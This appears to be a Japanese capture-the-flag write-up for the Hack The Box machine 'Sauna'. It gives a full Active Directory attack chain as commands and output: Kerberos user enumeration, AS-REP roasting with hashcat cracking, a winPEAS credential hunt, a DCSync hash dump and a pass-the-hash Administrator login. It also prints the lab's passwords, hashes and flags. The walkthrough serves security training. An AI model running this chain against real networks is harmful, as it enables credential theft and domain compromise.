https://app.hackthebox.com/machines/Sauna

## STEP 1
```sh
└─$ rustscan -a 10.129.95.180 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.95.180:53
Open 10.129.95.180:80
Open 10.129.95.180:88
Open 10.129.95.180:135
Open 10.129.95.180:139
Open 10.129.95.180:389
Open 10.129.95.180:445
Open 10.129.95.180:464
Open 10.129.95.180:593
Open 10.129.95.180:636
Open 10.129.95.180:3268
Open 10.129.95.180:3269
Open 10.129.95.180:5985
Open 10.129.95.180:9389
Open 10.129.95.180:49668
Open 10.129.95.180:49673
Open 10.129.95.180:49674
Open 10.129.95.180:49676
Open 10.129.95.180:49685
Open 10.129.95.180:49692
10.129.95.180 -> [53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49676,49685,49692]
```
```sh
└─$ nmap -n -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49675,49674,49696 -sV 10.129.95.180
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 02:26 EDT
Nmap scan report for 10.129.95.180
Host is up (0.47s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-23 13:26:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.47 seconds
```


## STEP 2
80番にアクセス、従業員っぽい名前を確認
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Sauna_01.png">  
従業員の名前をメモ
```sh
└─$ cat userlist.txt 
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb
```
ワードリストを作成
```sh
└─$ ./username-anarchy -i userlist.txt > user.txt

└─$ head user.txt 
fergus
fergussmith
fergus.smith
fergussm
fergsmit
ferguss
f.smith
fsmith
sfergus
s.fergus
```
クレデンシャルなしでドメイン名「EGOTISTICAL-BANK.LOCAL」を確認
```sh
└─$ netexec ldap 10.129.95.180 -u '' -p '' --get-sid                                          
LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
LDAP        10.129.95.180   389    SAUNA            Domain SID
```
先ほどのリストを用いてユーザ名を確認したところ、「fsmith」を発見
```sh
└─$ ./kerbrute_linux_amd64 userenum --dc '10.129.95.180' -d 'EGOTISTICAL-BANK.LOCAL' user.txt               

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/29/25 - Ronnie Flathers @ropnop

2025/07/29 02:08:04 >  Using KDC(s):
2025/07/29 02:08:04 >   10.129.95.180:88

2025/07/29 02:08:04 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2025/07/29 02:08:10 >  Done! Tested 88 usernames (1 valid) in 6.058 seconds
```
asreproastにより、fsmith のtgsをゲット
```sh
└─$ sudo ntpdate 10.129.95.180                                                                                                  
2025-07-29 09:27:00.899816 (-0400) +25200.607821 +/- 0.170160 10.129.95.180 s1 no-leap
CLOCK: time stepped by 25200.607821

└─$ netexec ldap 10.129.95.180 -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p '' --asreproast asreproast.txt
LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
LDAP        10.129.95.180   389    SAUNA            $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:1795fcc8fbfb3ecf9ee579038a750bf0$962b94cb5f32cd7cbc367102f9cf919d2948118e444f7f68312dd04460340337115005ac6d7c1c4c0ebfb7d4643d45a63557645f3955f537c214339d1bbb342b05c385c23b22701cdf923efd2bd41cbbb930dbb087ea5af79aaaf64be20294a9f0285e067c91f6edc355a9894ca9f0988557a17dc024cc64ac3bfa98c050905afde3fa48da9ab4b0d272412f624e3bb6d770a08d8e969695777ba288967302d5c384d3fc6fc70a68dd9826e82552f2db655890c3c7965b4e67ff9344c1b4fed86ed27e682e79e11598c374947637b8f2d865ce0725bf58d0d486af0a863c06880911592fa01cb5d9760df94ab7ebb536ed6dabe3d01f85b1d22be62530629bb5
```
クラック成功、fsmithのパスワードはThestrokes23
```sh
└─$ name-that-hash -f asreproast.txt --no-banner --no-john                                                                            

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:59bee1196843ecf6fcbfe16e736d2f2e$8f2dd9c5a07d9fee96a351010bafbd7c9d2de474aa5ec6925773990cd87534c81d01746c1aeb6a0481f8101b95081746247212fc3918899124294f7c123eb12216a599ce297c617c9d263e02e72d4c5
e148e561af9281a549d8a79445ce0fc5c6a12dd97acee05a8225234eb6da2ec7ffe8821bc78225b9a645ca2bd4bceaa022a11d9550aaef0fe8be1c50271e9bbdc3d3bb8e4c381863a16472bcac8f7da8eccd8a1ad6e2b8c7abc3af275649b0b51bb11ea373a3e8b025c40f63eaae65931bc4c5ca3728
6093cc5034caabf53fd1a384144072569c8ee438fecb0c0f7db5e4a68cc76154807a459b0bf6640979310ce17ff1eb8f38052ef36ea9d6e827870

Most Likely 
Kerberos 5 AS-REP etype 23, HC: 18200 Summary: Used for Windows Active Directory

└─$ hashcat -a 0 -m 18200 asreproast.txt /usr/share/wordlists/rockyou.txt --quiet                                      
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:59bee1196843ecf6fcbfe16e736d2f2e$8f2dd9c5a07d9fee96a351010bafbd7c9d2de474aa5ec6925773990cd87534c81d01746c1aeb6a0481f8101b95081746247212fc3918899124294f7c123eb12216a599ce297c617c9d263e02e72d4c5e148e561af9281a549d8a79445ce0fc5c6a12dd97acee05a8225234eb6da2ec7ffe8821bc78225b9a645ca2bd4bceaa022a11d9550aaef0fe8be1c50271e9bbdc3d3bb8e4c381863a16472bcac8f7da8eccd8a1ad6e2b8c7abc3af275649b0b51bb11ea373a3e8b025c40f63eaae65931bc4c5ca37286093cc5034caabf53fd1a384144072569c8ee438fecb0c0f7db5e4a68cc76154807a459b0bf6640979310ce17ff1eb8f38052ef36ea9d6e827870:Thestrokes23
```
5985番ポートが開いていたので、winrmログイン成功！ユーザフラグゲット
```sh
└─$ netexec winrm 10.129.95.180 -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p 'Thestrokes23' -X 'type C:\Users\fsmith\Desktop\user.txt'
WINRM       10.129.95.180   5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.95.180   5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
WINRM       10.129.95.180   5985   SAUNA            [+] Executed command (shell type: powershell)
WINRM       10.129.95.180   5985   SAUNA            4a10a0eee9f5bd93b20f39ac4bccfd01
```


## STEP 3
step2で取得したクレデンシャルでユーザ列挙
```sh
└─$ netexec ldap 10.129.95.180 -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p 'Thestrokes23' --users                              
LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
LDAP        10.129.95.180   389    SAUNA            [*] Enumerated 6 domain users: EGOTISTICAL-BANK.LOCAL
LDAP        10.129.95.180   389    SAUNA            -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.95.180   389    SAUNA            Administrator                 2021-07-26 12:16:16 0        Built-in account for administering the computer/domain      
LDAP        10.129.95.180   389    SAUNA            Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.95.180   389    SAUNA            krbtgt                        2020-01-23 00:45:30 0        Key Distribution Center Service Account                     
LDAP        10.129.95.180   389    SAUNA            HSmith                        2020-01-23 00:54:34 0                                                                    
LDAP        10.129.95.180   389    SAUNA            FSmith                        2020-01-23 11:45:19 0                                                                    
LDAP        10.129.95.180   389    SAUNA            svc_loanmgr                   2020-01-24 18:48:31 0                                                                    
```
step2で取得したクレデンシャルでbloodhoundを回す
```sh
└─$ netexec ldap 10.129.95.180 --dns-server '10.129.95.180' -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p 'Thestrokes23' --bloodhound --collection All
LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
LDAP        10.129.95.180   389    SAUNA            Resolved collection methods: acl, rdp, group, dcom, objectprops, session, psremote, localadmin, container, trusts
LDAP        10.129.95.180   389    SAUNA            Done in 01M 28S
LDAP        10.129.95.180   389    SAUNA            Compressing output into /home/kali/.nxc/logs/SAUNA_10.129.95.180_2025-07-29_100418_bloodhound.zip
```
svc_loanmgrを確認すると、ドメインに対して「GetChanges」「GetChangesALL」権限を持っている  
[公式](https://bloodhound.specterops.io/resources/edges/get-changes-all)では、この２つの権限を悪用してDCSyncできると確認  
とういうことで、svc_loanmgrのクレデンシャルを探そう
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Sauna_02.png">  


## STEP 4
winrm上でwinpeasを使って権限昇格を探す  
32ビットか64ビットで動かすか確認、systeminfoが拒否されたので.netで確認、64ビット版で実行しましょ
```powershell
└─$ evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint'

*Evil-WinRM* PS C:\Users\FSmith\Documents> systeminfo
Program 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1
+ systeminfo
+ ~~~~~~~~~~.
At line:1 char:1
+ systeminfo
+ ~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed

*Evil-WinRM* PS C:\Users\FSmith\Documents> [Environment]::Is64BitOperatingSystem
True
```
winpeasを配送して、実行
```sh
└─$ cp /usr/share/peass/winpeas/winPEASx64.exe smb

└─$ impacket-smbserver -smb2support share smb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
```powershell
*Evil-WinRM* PS C:\Users\FSmith\Documents> copy \\10.10.16.12\share\winPEASx64.exe .

*Evil-WinRM* PS C:\Users\FSmith\Documents> .\winPEASx64.exe userinfo quiet
 [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
  WinPEAS-ng by @hacktricks_live

       /---------------------------------------------------------------------------------\                                                                                                                                                  
       |                             Do you like PEASS?                                  |                                                                                                                                                  
       |---------------------------------------------------------------------------------|                                                                                                                                                  
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |                                                                                                                                                  
       |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                                                                  
       |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                  
       |---------------------------------------------------------------------------------|                                                                                                                                                  
       |                                 Thank you!                                      |                                                                                                                                                  
       \---------------------------------------------------------------------------------/                                                                                                                                                  
                                                                                                                                                                                                                                            
  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
   Creating Dynamic lists, this could take a while, please wait...                                                                                                                                                                          
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()                                                                                                                                                                                              
   at System.Management.ManagementScope.Initialize()                                                                                                                                                                                        
   at System.Management.ManagementObjectSearcher.Initialize()                                                                                                                                                                               
   at System.Management.ManagementObjectSearcher.Get()                                                                                                                                                                                      
   at winPEAS.Checks.Checks.CreateDynamicLists(Boolean isFileSearchEnabled)                                                                                                                                                                 
   - Creating current user groups list...
   - Creating active users list (local only)...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating disabled users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Admin users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...
        [skipped, file search is disabled]


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Users
È Check if you have some admin equivalent privileges https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups
  [X] Exception: Object reference not set to an instance of an object.
  Current user: FSmith
  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Builtin\Pre-Windows 2000 Compatible Access, Network, Authenticated Users, This Organization, NTLM Authentication
   =================================================================================================

    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current User Idle Time
   Current User   :     EGOTISTICALBANK\FSmith
   Idle Time      :     03h:40m:26s:593ms

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Tenant information (DsRegCmd.exe /status)
   Tenant is NOT Azure AD Joined.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Token privileges
È Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation
    SeMachineAccountPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

ÉÍÍÍÍÍÍÍÍÍÍ¹ Clipboard text

ÉÍÍÍÍÍÍÍÍÍÍ¹ Logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
   Computer Name           :   SAUNA
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   7/30/2025 9:37:14 AM
   Logons Count            :   135
   Password Last Set       :   7/26/2021 9:16:16 AM

   =================================================================================================

   Computer Name           :   SAUNA
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   SAUNA
   User Name               :   krbtgt
   User Id                 :   502
   Is Enabled              :   False
   User Type               :   User
   Comment                 :   Key Distribution Center Service Account
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/22/2020 10:45:30 PM

   =================================================================================================

   Computer Name           :   SAUNA
   User Name               :   HSmith
   User Id                 :   1103
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/22/2020 10:54:34 PM

   =================================================================================================

   Computer Name           :   SAUNA
   User Name               :   FSmith
   User Id                 :   1105
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   7/30/2025 10:41:58 AM
   Logons Count            :   22
   Password Last Set       :   1/23/2020 9:45:19 AM

   =================================================================================================

   Computer Name           :   SAUNA
   User Name               :   svc_loanmgr
   User Id                 :   1108
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/24/2020 4:48:31 PM

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ RDP Sessions
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\FSmith : FSmith [Allow: AllAccess]
    C:\Users\Public
    C:\Users\svc_loanmgr

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmgr
    DefaultPassword               :  Moneymakestheworldgoround!

ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
È Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: EGOTISTICALBANK
    SID: S-1-5-21-2966785786-3096785034-1186376766
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 1.00:00:00
    MinPasswordLength: 7
    PasswordHistoryLength: 24
    PasswordProperties: DOMAIN_PASSWORD_COMPLEX
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Print Logon Sessions

       /---------------------------------------------------------------------------------\                                                                                                                                                  
       |                             Do you like PEASS?                                  |                                                                                                                                                  
       |---------------------------------------------------------------------------------|                                                                                                                                                  
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |                                                                                                                                                  
       |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                                                                  
       |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                  
       |---------------------------------------------------------------------------------|                                                                                                                                                  
       |                                 Thank you!                                      |                                                                                                                                                  
       \---------------------------------------------------------------------------------/  
```
autologonから、svc_loanmgr のパスワード判明！
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmgr
    DefaultPassword               :  Moneymakestheworldgoround!
```
ということで、svc_loanmgrでDCSync攻撃！
```sh
└─$ impacket-secretsdump -ts -just-dc-ntlm 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-08-08 11:19:51] [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[2025-08-08 11:19:51] [*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7504784e68bb600a12667dc85792f5c1:::
[2025-08-08 11:20:03] [*] Cleaning up...
```
administratorでログイン成功！ルートフラグゲット！
```sh
└─$ evil-winrm -i 10.129.95.180 -u 'administrator' -H '823452073d75b9d1cf70ebdf86c7f98e'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
22fa5dff7fc57e44b5cc89cb16baabdc
```
